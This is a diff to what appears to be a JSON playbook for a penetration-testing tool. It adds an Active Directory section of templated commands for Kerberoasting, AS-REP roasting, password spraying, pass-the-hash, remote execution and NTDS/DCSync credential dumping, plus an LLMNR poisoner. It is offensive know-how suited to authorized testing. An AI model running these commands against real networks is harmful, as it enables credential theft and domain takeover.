@@ -40,6 +40,7 @@
       {"tool": "rpcclient", "command_template": "rpcclient -U '' {{ target }}", "description": "RPC enumeration for Windows environments", "install": "apt install samba-common-bin"}
     ],
     "exploitation": [
+      {"tool": "responder", "command_template": "sudo responder -I {{ interface }} -rdwv", "description": "LLMNR/NBT-NS/mDNS poisoner — captures NTLMv2 hashes from broadcast name resolution", "install": "apt install responder"},
       {"tool": "searchsploit", "command_template": "searchsploit {{ service_name }} {{ service_version }}", "description": "Local exploit database search", "install": "apt install exploitdb"},
       {"tool": "hydra", "command_template": "hydra -L users.txt -P passwords.txt {{ target }} smb", "description": "SMB credential brute force", "install": "apt install hydra"}
     ],
@@ -70,6 +71,37 @@
     ],
     "post_exploitation": [
       {"tool": "weevely", "command_template": "weevely generate password /tmp/shell.php", "description": "PHP web shell generator and manager", "install": "apt install weevely"}
+    ]
+  },
+  "active_directory": {
+    "recon": [
+      {"tool": "nmap", "command_template": "nmap -sV -p 88,135,139,389,445,464,593,636,3268,3269,5985 {{ target }}", "description": "Scan common AD/Kerberos/LDAP/SMB ports", "install": "apt install nmap"},
+      {"tool": "enum4linux", "command_template": "enum4linux -a {{ target }}", "description": "Enumerate SMB shares, users, groups, and policies", "install": "apt install enum4linux"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u '' -p '' --shares", "description": "Anonymous SMB share enumeration via NetExec", "install": "pip install netexec"}
+    ],
+    "scanning": [
+      {"tool": "kerbrute", "command_template": "kerbrute userenum --dc {{ target }} -d {{ domain }} /usr/share/seclists/Usernames/Names/names.txt", "description": "Kerberos user enumeration (no failed-login noise)", "install": "go install github.com/ropnop/kerbrute@latest"},
+      {"tool": "nxc", "command_template": "nxc ldap {{ target }} -u '' -p '' --users", "description": "LDAP user enumeration via NetExec", "install": "pip install netexec"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u '' -p '' --pass-pol", "description": "Enumerate password policy (lockout threshold, min length)", "install": "pip install netexec"}
+    ],
+    "enumeration": [
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -p {{ password }} --loggedon-users", "description": "List users currently logged on to target", "install": "pip install netexec"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -p {{ password }} --shares", "description": "List accessible SMB shares with credentials", "install": "pip install netexec"},
+      {"tool": "nxc", "command_template": "nxc ldap {{ target }} -u {{ username }} -p {{ password }} --groups", "description": "Enumerate AD groups via LDAP", "install": "pip install netexec"},
+      {"tool": "impacket-GetUserSPNs", "command_template": "impacket-GetUserSPNs '{{ domain }}/{{ username }}:{{ password }}' -dc-ip {{ target }} -request", "description": "Kerberoasting — request TGS tickets for service accounts", "install": "pip install impacket"},
+      {"tool": "impacket-GetNPUsers", "command_template": "impacket-GetNPUsers '{{ domain }}/' -dc-ip {{ target }} -usersfile users.txt -no-pass -format hashcat", "description": "AS-REP roasting — get hashes for accounts with pre-auth disabled", "install": "pip install impacket"}
+    ],
+    "exploitation": [
+      {"tool": "kerbrute", "command_template": "kerbrute passwordspray --dc {{ target }} -d {{ domain }} users.txt {{ password }}", "description": "Kerberos password spray (avoids NTLM lockouts)", "install": "go install github.com/ropnop/kerbrute@latest"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }}/24 -u {{ username }} -p {{ password }} --continue-on-success", "description": "SMB credential spray across subnet", "install": "pip install netexec"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -H {{ hash }} --local-auth", "description": "Pass-the-hash via NetExec", "install": "pip install netexec"},
+      {"tool": "impacket-psexec", "command_template": "impacket-psexec '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'", "description": "Remote execution via SMB service pipe", "install": "pip install impacket"},
+      {"tool": "impacket-wmiexec", "command_template": "impacket-wmiexec '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'", "description": "Remote execution via WMI (lower noise than psexec)", "install": "pip install impacket"}
+    ],
+    "post_exploitation": [
+      {"tool": "impacket-secretsdump", "command_template": "impacket-secretsdump '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'", "description": "Dump SAM, LSA secrets, cached credentials and NTDS.dit hashes", "install": "pip install impacket"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -p {{ password }} --ntds", "description": "Dump NTDS.dit domain hashes via NetExec", "install": "pip install netexec"},
+      {"tool": "impacket-secretsdump", "command_template": "impacket-secretsdump -just-dc-ntlm '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'", "description": "DCSync — pull all NTLM hashes from domain controller", "install": "pip install impacket"}
     ]
   },
   "cloud_aws": {
